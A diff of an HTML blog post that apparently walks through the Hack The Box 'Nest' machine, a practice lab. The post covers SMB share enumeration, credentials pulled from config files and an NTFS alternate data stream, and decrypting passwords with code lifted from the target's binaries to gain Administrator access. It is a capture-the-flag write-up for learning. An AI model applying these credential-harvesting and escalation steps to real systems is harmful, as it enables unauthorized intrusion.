@@ -6,30 +6,31 @@
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <link rel="icon" type="image/png" href="/favicon.png">
   <link rel="stylesheet" type="text/css" href="/css/style.css">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Courier+Prime:wght@700&family=Inconsolata&family=Source+Code+Pro&display=swap" rel="stylesheet">
+  <link rel="preconnect" href="https://fonts.gstatic.com"> 
+  <link
+  href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@500&family=Kanit:wght@600&family=Roboto&family=Electrolize&display=swap&family=Fira+Mono&family=Cousine&display=swapdisplay=swap&family=IBM+Plex+Mono&display=swap&family=Courier+Prime:wght@700&display=swap"
+  rel="stylesheet"> 
+  <link rel="preconnect" href="https://fonts.gstatic.com">
   <script src="https://kit.fontawesome.com/65ad30df58.js" crossorigin="anonymous"></script>
-  <!--<script src="/dist/mark.min.js" charset="UTF-8"></script>-->
+  <script src="/dist/mark.min.js" charset="UTF-8"></script>
 <title>Hackthebox - Nest Writeup &mdash; fmash16's blog</title>
 <meta property="og:title" content="Hackthebox - Nest Writeup" />
       <meta property="og:description" content="An easy machine in HTB standards, but is quite hard." />
       <meta property="og:type" content="article" />
       <meta property="og:url" content="github" />
-      <meta property="og:image" content="https://fmash16.github.io/img/htb_nest/card.png" />
+      <meta property="og:image" content="https://fmash16.github.io//img/htb_nest/card.png" />
 
 </head>
 
-<body>
-<!-- <h1 class=blogtitle>./fmash16's blog </h1> -->
-<pre style="font-family:'Courier Prime';color:var(--accent-color);text-align:center;font-weight:1000">
- ___               _   ___   ___ 
-|  _|_____ ___ ___| |_|_  | |  _|
-|  _|     | .'|_ -|   |_| |_| . |
-|_| |_|_|_|__,|___|_|_|_____|___|
-                 u/fmash16's blog</pre>
+<div class=blogtitle><a href="/index.html">fmash16's blog</a></div> 
+<!--<pre style="font-family:'Courier Prime';color:var(--accent-color);text-align:center;font-weight:1000">-->
+ <!--___               _   ___   ___ -->
+<!--|  _|_____ ___ ___| |_|_  | |  _|-->
+<!--|  _|     | .'|_ -|   |_| |_| . |-->
+<!--|_| |_|_|_|__,|___|_|_|_____|___|-->
+                 <!--./fmash16's blog</pre>-->
 <nav>
-   <a href="/index.html">home</a>
+   <!--<a href="/index.html">home</a>-->
    <a href="/archive.html">archive</a>
    <a href="mailto:fmash16@gmail.com">mail</a>
    <a href="https://github.com/fmash16">github</a>
@@ -39,30 +40,34 @@
 </nav>
 
 <article>
-<input id="toggle" type="checkbox" checked>
-<label for="toggle">TOC</label>
-<nav class='toc'>
-    <ul>
-    <li><a href="#hackthebox---nest-writeup">Hackthebox - Nest Writeup</a></li>
-    <li><a href="#nmap-scan">Nmap scan</a></li>
-    <li><a href="#enumeration">Enumeration</a>
-    <ul>
-    <li><a href="#smbclient">smbclient</a></li>
-    </ul></li>
-    <li><a href="#privilege-escalation---user">Privilege Escalation - User</a>
-    <ul>
-    <li><a href="#encrypted-password-find">Encrypted password find</a></li>
-    <li><a href="#vb-script-encryption-debug">VB script encryption debug</a></li>
-    </ul></li>
-    <li><a href="#privilege-escalation---administrator">Privilege Escalation - Administrator</a>
-    <ul>
-    <li><a href="#hqk-reporting-service---port-4386">HQK reporting service - Port 4386</a></li>
-    <li><a href="#debug-mode-password---ntfs-ads">DEBUG mode password - ntfs ADS</a></li>
-    <li><a href="#ldap-creds-found">LDAP creds found</a></li>
-    <li><a href="#decryting-encrypted-pass-debugging-hqkldap.exednspy">Decryting encrypted pass debugging HqkLdap.exe(dnSpy)</a></li>
-    </ul></li>
-    </ul>
-</nav>
+<ul>
+<li><a href="#hackthebox---nest-writeup">Hackthebox - Nest
+Writeup</a></li>
+<li><a href="#nmap-scan">Nmap scan</a></li>
+<li><a href="#enumeration">Enumeration</a>
+<ul>
+<li><a href="#smbclient">smbclient</a></li>
+</ul></li>
+<li><a href="#privilege-escalation---user">Privilege Escalation -
+User</a>
+<ul>
+<li><a href="#encrypted-password-find">Encrypted password find</a></li>
+<li><a href="#vb-script-encryption-debug">VB script encryption
+debug</a></li>
+</ul></li>
+<li><a href="#privilege-escalation---administrator">Privilege Escalation
+- Administrator</a>
+<ul>
+<li><a href="#hqk-reporting-service---port-4386">HQK reporting service -
+Port 4386</a></li>
+<li><a href="#debug-mode-password---ntfs-ads">DEBUG mode password - ntfs
+ADS</a></li>
+<li><a href="#ldap-creds-found">LDAP creds found</a></li>
+<li><a
+href="#decryting-encrypted-pass-debugging-hqkldap.exednspy">Decryting
+encrypted pass debugging HqkLdap.exe(dnSpy)</a></li>
+</ul></li>
+</ul>
 <h1 id="hackthebox---nest-writeup">Hackthebox - Nest Writeup</h1>
 <p><img src="/img/htb_nest/card.png" /></p>
 <h1 id="nmap-scan">Nmap scan</h1>
@@ -73,12 +78,18 @@
 </ul>
 <h1 id="enumeration">Enumeration</h1>
 <h2 id="smbclient">smbclient</h2>
-<p>We use smblient to list the shares. And find a share named “Data” using NULL auth.</p>
-<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">smbclient</span> <span class="at">-L</span> <span class="dt">\\\\</span>10.10.10.178</span></code></pre></div>
+<p>We use smblient to list the shares. And find a share named “Data”
+using NULL auth.</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">smbclient</span> <span class="at">-L</span> <span class="dt">\\\\</span>10.10.10.178</span></code></pre></div>
 <p><img src="/img/htb_nest/1.png" /> We connect to the share using</p>
-<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">smbclient</span> <span class="dt">\\\\</span>10.10.10.178<span class="dt">\\</span>Data</span></code></pre></div>
-<p>We find an interesting file under <code>\Shared\Templates\HR\</code> named “Welcome Email.txt”. We get the file on our local mahcine using</p>
-<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">smb:</span> <span class="dt">\S</span>hared<span class="dt">\T</span>emplates<span class="dt">\H</span>R<span class="dt">\&gt;</span> get <span class="st">&quot;Welcome Email.txt&quot;</span></span></code></pre></div>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">smbclient</span> <span class="dt">\\\\</span>10.10.10.178<span class="dt">\\</span>Data</span></code></pre></div>
+<p>We find an interesting file under <code>\Shared\Templates\HR\</code>
+named “Welcome Email.txt”. We get the file on our local mahcine
+using</p>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">smb:</span> <span class="dt">\S</span>hared<span class="dt">\T</span>emplates<span class="dt">\H</span>R<span class="dt">\&gt;</span> get <span class="st">&quot;Welcome Email.txt&quot;</span></span></code></pre></div>
 <p>Having a look at the file we find</p>
 <p><img src="/img/htb_nest/2.png" /></p>
 <p>So we get some creds here. Creds found:</p>
@@ -88,22 +99,35 @@ Password: welcome2019</p>
 </blockquote>
 <h1 id="privilege-escalation---user">Privilege Escalation - User</h1>
 <h2 id="encrypted-password-find">Encrypted password find</h2>
-<p>Logging in to the smbserver using these creds, we see that we have access to the IT folder.</p>
-<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">smbclient</span> <span class="dt">\\\\</span>10.10.10.178<span class="dt">\\</span>Data <span class="at">-U</span> TempUser%welcome2019</span></code></pre></div>
-<p>We find an intersting file RU_config.xml under <code>\IT\Configs\RU Scanner\</code>. Catting out the contents, we find some creds here</p>
-<div class="sourceCode" id="cb5"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?xml</span> version=&quot;1.0&quot;<span class="kw">?&gt;</span> <span class="kw">&lt;ConfigFile</span><span class="ot"> xmlns:xsi=</span><span class="st">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><span class="ot"> xmlns:xsd=</span><span class="st">&quot;http://www.w3.org/2001/XMLSchema&quot;</span><span class="kw">&gt;</span> <span class="kw">&lt;Port&gt;</span>389<span class="kw">&lt;/Port&gt;</span> <span class="kw">&lt;Username&gt;</span>c.smith<span class="kw">&lt;/Username&gt;</span></span>
-<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>  <span class="kw">&lt;Password&gt;</span>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=<span class="kw">&lt;/Password&gt;</span></span>
-<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;/ConfigFile&gt;</span></span></code></pre></div>
+<p>Logging in to the smbserver using these creds, we see that we have
+access to the IT folder.</p>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">smbclient</span> <span class="dt">\\\\</span>10.10.10.178<span class="dt">\\</span>Data <span class="at">-U</span> TempUser%welcome2019</span></code></pre></div>
+<p>We find an intersting file RU_config.xml under
+<code>\IT\Configs\RU Scanner\</code>. Catting out the contents, we find
+some creds here</p>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode xml"><code class="sourceCode xml"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="fu">&lt;?xml</span><span class="ot"> version=</span><span class="st">&quot;1.0&quot;</span><span class="fu">?&gt;</span> &lt;<span class="kw">ConfigFile</span><span class="ot"> xmlns:xsi=</span><span class="st">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><span class="ot"> xmlns:xsd=</span><span class="st">&quot;http://www.w3.org/2001/XMLSchema&quot;</span>&gt; &lt;<span class="kw">Port</span>&gt;389&lt;/<span class="kw">Port</span>&gt; &lt;<span class="kw">Username</span>&gt;c.smith&lt;/<span class="kw">Username</span>&gt;</span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>  &lt;<span class="kw">Password</span>&gt;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&lt;/<span class="kw">Password</span>&gt;</span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">ConfigFile</span>&gt;</span></code></pre></div>
 <p>The password seems to be base64 encoded. So we decode it</p>
-<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE= <span class="kw">|</span> <span class="ex">base64</span> <span class="at">-d</span></span></code></pre></div>
-<p>The password includes unicode characters. So the hash is not base64. We look around the smbshare more and find something interesting in the config.xml file of notepad++</p>
-<div class="sourceCode" id="cb7"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span><span class="fu">History</span> nbMaxFile<span class="op">=</span><span class="st">&quot;15&quot;</span> inSubMenu<span class="op">=</span><span class="st">&quot;no&quot;</span> customLength<span class="op">=</span><span class="st">&quot;-1&quot;</span><span class="op">&gt;</span></span>
+<div class="sourceCode" id="cb6"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE= <span class="kw">|</span> <span class="fu">base64</span> <span class="at">-d</span></span></code></pre></div>
+<p>The password includes unicode characters. So the hash is not base64.
+We look around the smbshare more and find something interesting in the
+config.xml file of notepad++</p>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span><span class="fu">History</span> nbMaxFile<span class="op">=</span><span class="st">&quot;15&quot;</span> inSubMenu<span class="op">=</span><span class="st">&quot;no&quot;</span> customLength<span class="op">=</span><span class="st">&quot;-1&quot;</span><span class="op">&gt;</span></span>
 <span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a>    <span class="op">&lt;</span>File filename<span class="op">=</span><span class="st">&quot;C:\windows\System32\drivers\etc\hosts&quot;</span> <span class="op">/&gt;</span></span>
 <span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>    <span class="op">&lt;</span>File filename<span class="op">=</span><span class="st">&quot;\\HTB-NEST\Secure$\IT\Carl\Temp.txt&quot;</span> <span class="op">/&gt;</span></span>
 <span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>    <span class="op">&lt;</span>File filename<span class="op">=</span><span class="st">&quot;C:\Users\C.Smith\Desktop\todo.txt&quot;</span> <span class="op">/&gt;</span></span>
 <span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;/</span><span class="fu">History</span><span class="op">&gt;</span></span></code></pre></div>
 <h2 id="vb-script-encryption-debug">VB script encryption debug</h2>
-<p>In “VB Projects/WIP/RU/RUScanner” we find some visual basic scripts. These seem to perform the encryption and decryption of the password of the user. The script Utils.vb contains the decrypt funciton. We can use this script to decrypt the encrypted pass we found using online vb.net compiler <a href="https://dotnetfiddle.net/bjoBP6">here.</a></p>
+<p>In “VB Projects/WIP/RU/RUScanner” we find some visual basic scripts.
+These seem to perform the encryption and decryption of the password of
+the user. The script Utils.vb contains the decrypt funciton. We can use
+this script to decrypt the encrypted pass we found using online vb.net
+compiler <a href="https://dotnetfiddle.net/bjoBP6">here.</a></p>
 <div class="sourceCode" id="cb8"><pre class="sourceCode vb"><code class="sourceCode monobasic"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="kw">Imports</span> System</span>
 <span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="kw">Imports</span> System.Text</span>
 <span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="kw">Imports</span> System.Security.Cryptography</span>
@@ -228,20 +252,42 @@ Password: welcome2019</p>
 <p>User: c.smith<br />
 Password: xRxRxPANCAK3SxRxRx</p>
 </blockquote>
-<div class="sourceCode" id="cb9"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">smbclient</span> <span class="dt">\\\\</span>10.10.10.178<span class="dt">\\</span>Users <span class="at">-U</span> c.smith%xRxRxPANCAK3SxRxRx</span></code></pre></div>
+<div class="sourceCode" id="cb9"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">smbclient</span> <span class="dt">\\\\</span>10.10.10.178<span class="dt">\\</span>Users <span class="at">-U</span> c.smith%xRxRxPANCAK3SxRxRx</span></code></pre></div>
 <p>Listing the files recursively, we find our required user.txt</p>
-<h1 id="privilege-escalation---administrator">Privilege Escalation - Administrator</h1>
-<h2 id="hqk-reporting-service---port-4386">HQK reporting service - Port 4386</h2>
-<p>From the nmap port scan, we found an open port 4386. Banner grabbing using nc, we find a service “HQK Reporting Service V1.2” running on the port. We get a prompt but cannot execute any commands connecting with nc. We try with telned and get success.</p>
-<div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="ex">telnet</span> 10.10.10.178 4386</span></code></pre></div>
-<h2 id="debug-mode-password---ntfs-ads">DEBUG mode password - ntfs ADS</h2>
-<p>But we have limited execution. We can enter a debuyg mode using a debug mode password. We found a file named “Debug Mode Password.txt” in the <code>Users\C.Smith</code> share. We see that the file is empty. Looking around for quite a while, and using some help from the forum , I came to know of <a href="https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/">ntfs alternate data streams</a>. So basically, data can be stored in the ntfs files in a different stream for obsfucation. We can see that the file has an alternate data stream using allinfo command. We can get the data from the alternate stream executing the following</p>
-<div class="sourceCode" id="cb11"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">smb:</span> <span class="dt">\C</span>.Smith<span class="dt">\H</span>QK Reporting<span class="dt">\&gt;</span> allinfo <span class="st">&quot;Debug Mode Password.txt&quot;</span></span>
+<h1 id="privilege-escalation---administrator">Privilege Escalation -
+Administrator</h1>
+<h2 id="hqk-reporting-service---port-4386">HQK reporting service - Port
+4386</h2>
+<p>From the nmap port scan, we found an open port 4386. Banner grabbing
+using nc, we find a service “HQK Reporting Service V1.2” running on the
+port. We get a prompt but cannot execute any commands connecting with
+nc. We try with telned and get success.</p>
+<div class="sourceCode" id="cb10"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="ex">telnet</span> 10.10.10.178 4386</span></code></pre></div>
+<h2 id="debug-mode-password---ntfs-ads">DEBUG mode password - ntfs
+ADS</h2>
+<p>But we have limited execution. We can enter a debuyg mode using a
+debug mode password. We found a file named “Debug Mode Password.txt” in
+the <code>Users\C.Smith</code> share. We see that the file is empty.
+Looking around for quite a while, and using some help from the forum , I
+came to know of <a
+href="https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/">ntfs
+alternate data streams</a>. So basically, data can be stored in the ntfs
+files in a different stream for obsfucation. We can see that the file
+has an alternate data stream using allinfo command. We can get the data
+from the alternate stream executing the following</p>
+<div class="sourceCode" id="cb11"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">smb:</span> <span class="dt">\C</span>.Smith<span class="dt">\H</span>QK Reporting<span class="dt">\&gt;</span> allinfo <span class="st">&quot;Debug Mode Password.txt&quot;</span></span>
 <span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="ex">smb:</span> <span class="dt">\C</span>.Smith<span class="dt">\H</span>QK Reporting<span class="dt">\&gt;</span> get <span class="st">&quot;Debug Mode Password.txt:Password&quot;</span></span></code></pre></div>
 <p>Creds found: &gt; Password: WBQ201953D8w</p>
 <h2 id="ldap-creds-found">LDAP creds found</h2>
-<p>Now, we can use this password to enter debug mode on HQK and get more access to the files. Looking around, we see that directory ../ is HQK/ and contains a folder /LDAP. Going to the directory, we find a file ldap.conf that gives us the creds for the administrator.</p>
-<div class="sourceCode" id="cb12"><pre class="sourceCode txt"><code class="sourceCode default"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a>Domain=nest.local</span>
+<p>Now, we can use this password to enter debug mode on HQK and get more
+access to the files. Looking around, we see that directory ../ is HQK/
+and contains a folder /LDAP. Going to the directory, we find a file
+ldap.conf that gives us the creds for the administrator.</p>
+<div class="sourceCode" id="cb12"><pre
+class="sourceCode txt"><code class="sourceCode default"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a>Domain=nest.local</span>
 <span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a>Port=389</span>
 <span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a>BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local</span>
 <span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a>User=Administrator</span>
@@ -251,12 +297,24 @@ Password: xRxRxPANCAK3SxRxRx</p>
 <p>User: Administrator<br />
 Password: yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=</p>
 </blockquote>
-<h2 id="decryting-encrypted-pass-debugging-hqkldap.exednspy">Decryting encrypted pass debugging HqkLdap.exe(dnSpy)</h2>
-<p>The password is encrypted. We also found a HqkLdap.exe file there. We can have a look at the file. We found this file in the Users share under “C.Smith/HQK Reporting/AD Integration Module/”. The file is a .NET binary.</p>
-<p>In order to debug the file, we use a tool called <a href="https://github.com/0xd4d/dnSpy">dnSpy</a> We can decompile the binary into C# code. Looking at the code, we find a class <code>HqkLdap.CR</code> that has a function <code>DS</code> which decrypts the string provided. So we can use this function to decrypt our obtained hash.</p>
+<h2 id="decryting-encrypted-pass-debugging-hqkldap.exednspy">Decryting
+encrypted pass debugging HqkLdap.exe(dnSpy)</h2>
+<p>The password is encrypted. We also found a HqkLdap.exe file there. We
+can have a look at the file. We found this file in the Users share under
+“C.Smith/HQK Reporting/AD Integration Module/”. The file is a .NET
+binary.</p>
+<p>In order to debug the file, we use a tool called <a
+href="https://github.com/0xd4d/dnSpy">dnSpy</a> We can decompile the
+binary into C# code. Looking at the code, we find a class
+<code>HqkLdap.CR</code> that has a function <code>DS</code> which
+decrypts the string provided. So we can use this function to decrypt our
+obtained hash.</p>
 <p><img src="/img/htb_nest/dnspy.png" /></p>
-<p>We head over to the awesome <a href="https://dotnetfiddle.net/o4iGop">.netfidler</a> and edit our C# script to decrypt our hash. The script stands</p>
-<div class="sourceCode" id="cb13"><pre class="sourceCode c#"><code class="sourceCode cs"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="kw">using</span> System<span class="op">;</span></span>
+<p>We head over to the awesome <a
+href="https://dotnetfiddle.net/o4iGop">.netfidler</a> and edit our C#
+script to decrypt our hash. The script stands</p>
+<div class="sourceCode" id="cb13"><pre
+class="sourceCode c#"><code class="sourceCode cs"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="kw">using</span> System<span class="op">;</span></span>
 <span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="kw">using</span> System<span class="op">.</span><span class="fu">IO</span><span class="op">;</span></span>
 <span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a><span class="kw">using</span> System<span class="op">.</span><span class="fu">Security</span><span class="op">.</span><span class="fu">Cryptography</span><span class="op">;</span></span>
 <span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a><span class="kw">using</span> System<span class="op">.</span><span class="fu">Text</span><span class="op">;</span></span>
@@ -354,7 +412,8 @@ Password: yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=</p>
 <span id="cb13-96"><a href="#cb13-96" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Token: 0x04000008 RID: 8</span></span>
 <span id="cb13-97"><a href="#cb13-97" aria-hidden="true" tabindex="-1"></a>    <span class="kw">private</span> <span class="dt">const</span> <span class="dt">string</span> SA <span class="op">=</span> <span class="st">&quot;1313Rf99&quot;</span><span class="op">;</span></span>
 <span id="cb13-98"><a href="#cb13-98" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span></code></pre></div>
-<p>Running the script, we get our decrypted password for administrator.</p>
+<p>Running the script, we get our decrypted password for
+administrator.</p>
 <p><img src="/img/htb_nest/3.png" /></p>
 <p>Creds found:</p>
 <blockquote>
@@ -362,8 +421,10 @@ Password: yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=</p>
 Password: XtH4nkS4Pl4y1nGX</p>
 </blockquote>
 <p>Now we use the creds to get into the C$ share on smb</p>
-<div class="sourceCode" id="cb14"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="ex">smbclient</span> <span class="dt">\\\\</span>10.10.10.178<span class="dt">\\</span>Users <span class="at">-U</span> Administrator%XtH4nkS4Pl4y1nGX</span></code></pre></div>
-<p>We successfully got in. Now we can read our root.txt file from <code>C:\Users\Administrator\Desktop\root.txt</code></p>
+<div class="sourceCode" id="cb14"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="ex">smbclient</span> <span class="dt">\\\\</span>10.10.10.178<span class="dt">\\</span>Users <span class="at">-U</span> Administrator%XtH4nkS4Pl4y1nGX</span></code></pre></div>
+<p>We successfully got in. Now we can read our root.txt file from
+<code>C:\Users\Administrator\Desktop\root.txt</code></p>
 </article>
 
 <footer>
